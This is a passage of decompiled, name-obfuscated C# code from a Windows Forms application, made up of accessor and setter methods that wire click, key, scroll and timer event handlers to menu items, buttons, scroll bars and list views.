	}

	// Token: 0x0600078E RID: 1934 RVA: 0x00038378 File Offset: 0x00036578
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_625(GClass7 gclass7_13)
	{
		KeyEventHandler value = new KeyEventHandler(this.method_250);
		ColumnClickEventHandler value2 = new ColumnClickEventHandler(this.method_251);
		GClass7 gclass = this.gclass7_8;
		if (gclass != null)
		{
			gclass.KeyDown -= value;
			gclass.ColumnClick -= value2;
		}
		this.gclass7_8 = gclass7_13;
		gclass = this.gclass7_8;
		if (gclass != null)
		{
			gclass.KeyDown += value;
			gclass.ColumnClick += value2;
		}
	}

	// Token: 0x0600078F RID: 1935 RVA: 0x000062DC File Offset: 0x000044DC
	internal ToolStripMenuItem vmethod_626()
	{
		return this.toolStripMenuItem_116;
	}

	// Token: 0x06000790 RID: 1936 RVA: 0x000383D8 File Offset: 0x000365D8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_627(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_204);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_116;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_116 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_116;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000791 RID: 1937 RVA: 0x000062E4 File Offset: 0x000044E4
	internal ContextMenuStrip vmethod_628()
	{
		return this.contextMenuStrip_11;
	}

	// Token: 0x06000792 RID: 1938 RVA: 0x000062EC File Offset: 0x000044EC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_629(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_11 = contextMenuStrip_14;
	}

	// Token: 0x06000793 RID: 1939 RVA: 0x000062F5 File Offset: 0x000044F5
	internal ToolStripMenuItem vmethod_630()
	{
		return this.toolStripMenuItem_117;
	}

	// Token: 0x06000794 RID: 1940 RVA: 0x0003841C File Offset: 0x0003661C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_631(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_208);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_117;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_117 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_117;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000795 RID: 1941 RVA: 0x000062FD File Offset: 0x000044FD
	internal ToolStripSeparator vmethod_632()
	{
		return this.toolStripSeparator_30;
	}

	// Token: 0x06000796 RID: 1942 RVA: 0x00006305 File Offset: 0x00004505
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_633(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_30 = toolStripSeparator_39;
	}

	// Token: 0x06000797 RID: 1943 RVA: 0x0000630E File Offset: 0x0000450E
	internal ToolStripMenuItem vmethod_634()
	{
		return this.toolStripMenuItem_118;
	}

	// Token: 0x06000798 RID: 1944 RVA: 0x00006316 File Offset: 0x00004516
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_635(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_118 = toolStripMenuItem_136;
	}

	// Token: 0x06000799 RID: 1945 RVA: 0x0000631F File Offset: 0x0000451F
	internal ToolStripMenuItem vmethod_636()
	{
		return this.toolStripMenuItem_119;
	}

	// Token: 0x0600079A RID: 1946 RVA: 0x00038460 File Offset: 0x00036660
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_637(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_209);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_119;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_119 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_119;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600079B RID: 1947 RVA: 0x00006327 File Offset: 0x00004527
	internal ToolStripMenuItem vmethod_638()
	{
		return this.toolStripMenuItem_120;
	}

	// Token: 0x0600079C RID: 1948 RVA: 0x000384A4 File Offset: 0x000366A4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_639(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_210);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_120;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_120 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_120;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600079D RID: 1949 RVA: 0x0000632F File Offset: 0x0000452F
	internal ToolStripMenuItem vmethod_640()
	{
		return this.toolStripMenuItem_121;
	}

	// Token: 0x0600079E RID: 1950 RVA: 0x000384E8 File Offset: 0x000366E8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_641(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_211);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_121;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_121 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_121;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600079F RID: 1951 RVA: 0x00006337 File Offset: 0x00004537
	internal ToolStripMenuItem vmethod_642()
	{
		return this.toolStripMenuItem_122;
	}

	// Token: 0x060007A0 RID: 1952 RVA: 0x0003852C File Offset: 0x0003672C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_643(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_212);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_122;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_122 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_122;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060007A1 RID: 1953 RVA: 0x0000633F File Offset: 0x0000453F
	internal ToolStripSeparator vmethod_644()
	{
		return this.toolStripSeparator_31;
	}

	// Token: 0x060007A2 RID: 1954 RVA: 0x00006347 File Offset: 0x00004547
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_645(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_31 = toolStripSeparator_39;
	}

	// Token: 0x060007A3 RID: 1955 RVA: 0x00006350 File Offset: 0x00004550
	internal ToolStripMenuItem vmethod_646()
	{
		return this.toolStripMenuItem_123;
	}

	// Token: 0x060007A4 RID: 1956 RVA: 0x00038570 File Offset: 0x00036770
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_647(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_215);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_123;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_123 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_123;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060007A5 RID: 1957 RVA: 0x00006358 File Offset: 0x00004558
	internal ToolStripSeparator vmethod_648()
	{
		return this.toolStripSeparator_32;
	}

	// Token: 0x060007A6 RID: 1958 RVA: 0x00006360 File Offset: 0x00004560
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_649(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_32 = toolStripSeparator_39;
	}

	// Token: 0x060007A7 RID: 1959 RVA: 0x00006369 File Offset: 0x00004569
	internal ToolStripMenuItem vmethod_650()
	{
		return this.toolStripMenuItem_124;
	}

	// Token: 0x060007A8 RID: 1960 RVA: 0x00006371 File Offset: 0x00004571
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_651(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_124 = toolStripMenuItem_136;
	}

	// Token: 0x060007A9 RID: 1961 RVA: 0x0000637A File Offset: 0x0000457A
	internal ToolStripMenuItem vmethod_652()
	{
		return this.toolStripMenuItem_125;
	}

	// Token: 0x060007AA RID: 1962 RVA: 0x000385B4 File Offset: 0x000367B4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_653(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_218);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_125;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_125 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_125;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060007AB RID: 1963 RVA: 0x00006382 File Offset: 0x00004582
	internal ToolStripSeparator vmethod_654()
	{
		return this.toolStripSeparator_33;
	}

	// Token: 0x060007AC RID: 1964 RVA: 0x0000638A File Offset: 0x0000458A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_655(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_33 = toolStripSeparator_39;
	}

	// Token: 0x060007AD RID: 1965 RVA: 0x00006393 File Offset: 0x00004593
	internal ToolStripMenuItem vmethod_656()
	{
		return this.toolStripMenuItem_126;
	}

	// Token: 0x060007AE RID: 1966 RVA: 0x000385F8 File Offset: 0x000367F8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_657(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_219);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_126;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_126 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_126;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060007AF RID: 1967 RVA: 0x0000639B File Offset: 0x0000459B
	internal ToolStripMenuItem vmethod_658()
	{
		return this.toolStripMenuItem_127;
	}

	// Token: 0x060007B0 RID: 1968 RVA: 0x0003863C File Offset: 0x0003683C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_659(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_214);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_127;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_127 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_127;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060007B1 RID: 1969 RVA: 0x000063A3 File Offset: 0x000045A3
	internal ToolStripSeparator vmethod_660()
	{
		return this.toolStripSeparator_34;
	}

	// Token: 0x060007B2 RID: 1970 RVA: 0x000063AB File Offset: 0x000045AB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_661(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_34 = toolStripSeparator_39;
	}

	// Token: 0x060007B3 RID: 1971 RVA: 0x000063B4 File Offset: 0x000045B4
	internal ToolStripMenuItem vmethod_662()
	{
		return this.toolStripMenuItem_128;
	}

	// Token: 0x060007B4 RID: 1972 RVA: 0x00038680 File Offset: 0x00036880
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_663(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_216);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_128;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_128 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_128;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060007B5 RID: 1973 RVA: 0x000063BC File Offset: 0x000045BC
	internal ToolStripStatusLabel vmethod_664()
	{
		return this.toolStripStatusLabel_30;
	}

	// Token: 0x060007B6 RID: 1974 RVA: 0x000063C4 File Offset: 0x000045C4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_665(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_30 = toolStripStatusLabel_40;
	}

	// Token: 0x060007B7 RID: 1975 RVA: 0x000063CD File Offset: 0x000045CD
	internal ToolStripStatusLabel vmethod_666()
	{
		return this.toolStripStatusLabel_31;
	}

	// Token: 0x060007B8 RID: 1976 RVA: 0x000063D5 File Offset: 0x000045D5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_667(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_31 = toolStripStatusLabel_40;
	}

	// Token: 0x060007B9 RID: 1977 RVA: 0x000063DE File Offset: 0x000045DE
	internal System.Windows.Forms.Timer vmethod_668()
	{
		return this.timer_2;
	}

	// Token: 0x060007BA RID: 1978 RVA: 0x000386C4 File Offset: 0x000368C4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_669(System.Windows.Forms.Timer timer_4)
	{
		EventHandler value = new EventHandler(this.method_217);
		System.Windows.Forms.Timer timer = this.timer_2;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_2 = timer_4;
		timer = this.timer_2;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x060007BB RID: 1979 RVA: 0x000063E6 File Offset: 0x000045E6
	internal ToolStripStatusLabel vmethod_670()
	{
		return this.toolStripStatusLabel_32;
	}

	// Token: 0x060007BC RID: 1980 RVA: 0x000063EE File Offset: 0x000045EE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_671(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_32 = toolStripStatusLabel_40;
	}

	// Token: 0x060007BD RID: 1981 RVA: 0x000063F7 File Offset: 0x000045F7
	internal ToolStripStatusLabel vmethod_672()
	{
		return this.toolStripStatusLabel_33;
	}

	// Token: 0x060007BE RID: 1982 RVA: 0x000063FF File Offset: 0x000045FF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_673(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_33 = toolStripStatusLabel_40;
	}

	// Token: 0x060007BF RID: 1983 RVA: 0x00006408 File Offset: 0x00004608
	internal ToolStripStatusLabel vmethod_674()
	{
		return this.toolStripStatusLabel_34;
	}

	// Token: 0x060007C0 RID: 1984 RVA: 0x00006410 File Offset: 0x00004610
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_675(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_34 = toolStripStatusLabel_40;
	}

	// Token: 0x060007C1 RID: 1985 RVA: 0x00006419 File Offset: 0x00004619
	internal ToolStripStatusLabel vmethod_676()
	{
		return this.toolStripStatusLabel_35;
	}

	// Token: 0x060007C2 RID: 1986 RVA: 0x00006421 File Offset: 0x00004621
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_677(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_35 = toolStripStatusLabel_40;
	}

	// Token: 0x060007C3 RID: 1987 RVA: 0x0000642A File Offset: 0x0000462A
	internal CheckBox vmethod_678()
	{
		return this.checkBox_5;
	}

	// Token: 0x060007C4 RID: 1988 RVA: 0x00006432 File Offset: 0x00004632
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_679(CheckBox checkBox_8)
	{
		this.checkBox_5 = checkBox_8;
	}

	// Token: 0x060007C5 RID: 1989 RVA: 0x0000643B File Offset: 0x0000463B
	internal PictureBox vmethod_680()
	{
		return this.pictureBox_4;
	}

	// Token: 0x060007C6 RID: 1990 RVA: 0x00038708 File Offset: 0x00036908
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_681(PictureBox pictureBox_7)
	{
		EventHandler value = new EventHandler(this.method_220);
		PictureBox pictureBox = this.pictureBox_4;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_4 = pictureBox_7;
		pictureBox = this.pictureBox_4;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x060007C7 RID: 1991 RVA: 0x00006443 File Offset: 0x00004643
	internal PictureBox vmethod_682()
	{
		return this.pictureBox_5;
	}

	// Token: 0x060007C8 RID: 1992 RVA: 0x0003874C File Offset: 0x0003694C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_683(PictureBox pictureBox_7)
	{
		EventHandler value = new EventHandler(this.method_221);
		PictureBox pictureBox = this.pictureBox_5;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_5 = pictureBox_7;
		pictureBox = this.pictureBox_5;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x060007C9 RID: 1993 RVA: 0x0000644B File Offset: 0x0000464B
	internal CheckBox vmethod_684()
	{
		return this.checkBox_6;
	}

	// Token: 0x060007CA RID: 1994 RVA: 0x00006453 File Offset: 0x00004653
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_685(CheckBox checkBox_8)
	{
		this.checkBox_6 = checkBox_8;
	}

	// Token: 0x060007CB RID: 1995 RVA: 0x0000645C File Offset: 0x0000465C
	internal VisualButton vmethod_686()
	{
		return this.visualButton_3;
	}

	// Token: 0x060007CC RID: 1996 RVA: 0x00038790 File Offset: 0x00036990
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_687(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_222);
		VisualButton visualButton = this.visualButton_3;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_3 = visualButton_24;
		visualButton = this.visualButton_3;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007CD RID: 1997 RVA: 0x00006464 File Offset: 0x00004664
	internal VisualScrollBar vmethod_688()
	{
		return this.visualScrollBar_0;
	}

	// Token: 0x060007CE RID: 1998 RVA: 0x000387D4 File Offset: 0x000369D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_689(VisualScrollBar visualScrollBar_3)
	{
		ScrollEventHandler scrollEventHandler = new ScrollEventHandler(this.method_223);
		KeyEventHandler value = new KeyEventHandler(this.method_254);
		VisualScrollBar visualScrollBar = this.visualScrollBar_0;
		if (visualScrollBar != null)
		{
			visualScrollBar.Scroll -= scrollEventHandler;
			visualScrollBar.KeyDown -= value;
		}
		this.visualScrollBar_0 = visualScrollBar_3;
		visualScrollBar = this.visualScrollBar_0;
		if (visualScrollBar != null)
		{
			visualScrollBar.Scroll += scrollEventHandler;
			visualScrollBar.KeyDown += value;
		}
	}

	// Token: 0x060007CF RID: 1999 RVA: 0x0000646C File Offset: 0x0000466C
	internal ToolStripSeparator vmethod_690()
	{
		return this.toolStripSeparator_35;
	}

	// Token: 0x060007D0 RID: 2000 RVA: 0x00006474 File Offset: 0x00004674
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_691(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_35 = toolStripSeparator_39;
	}

	// Token: 0x060007D1 RID: 2001 RVA: 0x0000647D File Offset: 0x0000467D
	internal VisualButton vmethod_692()
	{
		return this.visualButton_4;
	}

	// Token: 0x060007D2 RID: 2002 RVA: 0x00038834 File Offset: 0x00036A34
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_693(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_225);
		VisualButton visualButton = this.visualButton_4;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_4 = visualButton_24;
		visualButton = this.visualButton_4;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007D3 RID: 2003 RVA: 0x00006485 File Offset: 0x00004685
	internal VisualButton vmethod_694()
	{
		return this.visualButton_5;
	}

	// Token: 0x060007D4 RID: 2004 RVA: 0x00038878 File Offset: 0x00036A78
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_695(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_226);
		VisualButton visualButton = this.visualButton_5;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_5 = visualButton_24;
		visualButton = this.visualButton_5;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007D5 RID: 2005 RVA: 0x0000648D File Offset: 0x0000468D
	internal VisualButton vmethod_696()
	{
		return this.visualButton_6;
	}

	// Token: 0x060007D6 RID: 2006 RVA: 0x000388BC File Offset: 0x00036ABC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_697(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_227);
		VisualButton visualButton = this.visualButton_6;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_6 = visualButton_24;
		visualButton = this.visualButton_6;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007D7 RID: 2007 RVA: 0x00006495 File Offset: 0x00004695
	internal VisualButton vmethod_698()
	{
		return this.visualButton_7;
	}

	// Token: 0x060007D8 RID: 2008 RVA: 0x00038900 File Offset: 0x00036B00
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_699(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_229);
		VisualButton visualButton = this.visualButton_7;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_7 = visualButton_24;
		visualButton = this.visualButton_7;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007D9 RID: 2009 RVA: 0x0000649D File Offset: 0x0000469D
	internal VisualButton vmethod_700()
	{
		return this.visualButton_8;
	}

	// Token: 0x060007DA RID: 2010 RVA: 0x00038944 File Offset: 0x00036B44
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_701(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_230);
		VisualButton visualButton = this.visualButton_8;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_8 = visualButton_24;
		visualButton = this.visualButton_8;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007DB RID: 2011 RVA: 0x000064A5 File Offset: 0x000046A5
	internal VisualButton vmethod_702()
	{
		return this.visualButton_9;
	}

	// Token: 0x060007DC RID: 2012 RVA: 0x00038988 File Offset: 0x00036B88
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_703(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_232);
		VisualButton visualButton = this.visualButton_9;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_9 = visualButton_24;
		visualButton = this.visualButton_9;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007DD RID: 2013 RVA: 0x000064AD File Offset: 0x000046AD
	internal VisualButton vmethod_704()
	{
		return this.visualButton_10;
	}

	// Token: 0x060007DE RID: 2014 RVA: 0x000389CC File Offset: 0x00036BCC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_705(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_233);
		VisualButton visualButton = this.visualButton_10;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_10 = visualButton_24;
		visualButton = this.visualButton_10;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007DF RID: 2015 RVA: 0x000064B5 File Offset: 0x000046B5
	internal VisualButton vmethod_706()
	{
		return this.visualButton_11;
	}

	// Token: 0x060007E0 RID: 2016 RVA: 0x00038A10 File Offset: 0x00036C10
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_707(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_234);
		VisualButton visualButton = this.visualButton_11;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_11 = visualButton_24;
		visualButton = this.visualButton_11;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007E1 RID: 2017 RVA: 0x000064BD File Offset: 0x000046BD
	internal VisualButton vmethod_708()
	{
		return this.visualButton_12;
	}

	// Token: 0x060007E2 RID: 2018 RVA: 0x00038A54 File Offset: 0x00036C54
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_709(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_235);
		VisualButton visualButton = this.visualButton_12;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_12 = visualButton_24;
		visualButton = this.visualButton_12;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007E3 RID: 2019 RVA: 0x000064C5 File Offset: 0x000046C5
	internal VisualButton vmethod_710()
	{
		return this.visualButton_13;
	}

	// Token: 0x060007E4 RID: 2020 RVA: 0x00038A98 File Offset: 0x00036C98
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_711(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_236);
		VisualButton visualButton = this.visualButton_13;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_13 = visualButton_24;
		visualButton = this.visualButton_13;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007E5 RID: 2021 RVA: 0x000064CD File Offset: 0x000046CD
	internal VisualButton vmethod_712()
	{
		return this.visualButton_14;
	}

	// Token: 0x060007E6 RID: 2022 RVA: 0x00038ADC File Offset: 0x00036CDC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_713(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_237);
		VisualButton visualButton = this.visualButton_14;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_14 = visualButton_24;
		visualButton = this.visualButton_14;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060007E7 RID: 2023 RVA: 0x000064D5 File Offset: 0x000046D5
	internal VisualScrollBar vmethod_714()
	{
		return this.visualScrollBar_1;
	}

	// Token: 0x060007E8 RID: 2024 RVA: 0x00038B20 File Offset: 0x00036D20
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_715(VisualScrollBar visualScrollBar_3)
	{
		ScrollEventHandler scrollEventHandler = new ScrollEventHandler(this.method_238);
		KeyEventHandler value = new KeyEventHandler(this.method_260);
		VisualScrollBar visualScrollBar = this.visualScrollBar_1;
		if (visualScrollBar != null)
		{
			visualScrollBar.Scroll -= scrollEventHandler;
			visualScrollBar.KeyDown -= value;
		}
		this.visualScrollBar_1 = visualScrollBar_3;
		visualScrollBar = this.visualScrollBar_1;
		if (visualScrollBar != null)
		{
			visualScrollBar.Scroll += scrollEventHandler;
			visualScrollBar.KeyDown += value;
		}
	}

	// Token: 0x060007E9 RID: 2025 RVA: 0x000064DD File Offset: 0x000046DD
	internal VisualScrollBar vmethod_716()
	{
		return this.visualScrollBar_2;
	}

	// Token: 0x060007EA RID: 2026 RVA: 0x00038B80 File Offset: 0x00036D80
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_717(VisualScrollBar visualScrollBar_3)
	{
		ScrollEventHandler scrollEventHandler = new ScrollEventHandler(this.method_240);
		KeyEventHandler value = new KeyEventHandler(this.method_265);
		VisualScrollBar visualScrollBar = this.visualScrollBar_2;
		if (visualScrollBar != null)
		{
			visualScrollBar.Scroll -= scrollEventHandler;
			visualScrollBar.KeyDown -= value;
		}
		this.visualScrollBar_2 = visualScrollBar_3;
		visualScrollBar = this.visualScrollBar_2;
		if (visualScrollBar != null)
		{
			visualScrollBar.Scroll += scrollEventHandler;
			visualScrollBar.KeyDown += value;
		}
	}

	// Token: 0x060007EB RID: 2027 RVA: 0x000064E5 File Offset: 0x000046E5
	internal GClass7 vmethod_718()
	{
		return this.gclass7_9;
	}

	// Token: 0x060007EC RID: 2028 RVA: 0x00038BE0 File Offset: 0x00036DE0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_719(GClass7 gclass7_13)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_125);
		KeyEventHandler value2 = new KeyEventHandler(this.method_132);
		ColumnClickEventHandler value3 = new ColumnClickEventHandler(this.method_187);
		GClass7 gclass = this.gclass7_9;
		if (gclass != null)
		{
			gclass.MouseUp -= value;
			gclass.KeyDown -= value2;
			gclass.ColumnClick -= value3;
		}
		this.gclass7_9 = gclass7_13;
		gclass = this.gclass7_9;
		if (gclass != null)
		{
			gclass.MouseUp += value;
			gclass.KeyDown += value2;
			gclass.ColumnClick += value3;
		}
	}

	// Token: 0x060007ED RID: 2029 RVA: 0x000064ED File Offset: 0x000046ED
	internal GClass7 vmethod_720()
	{
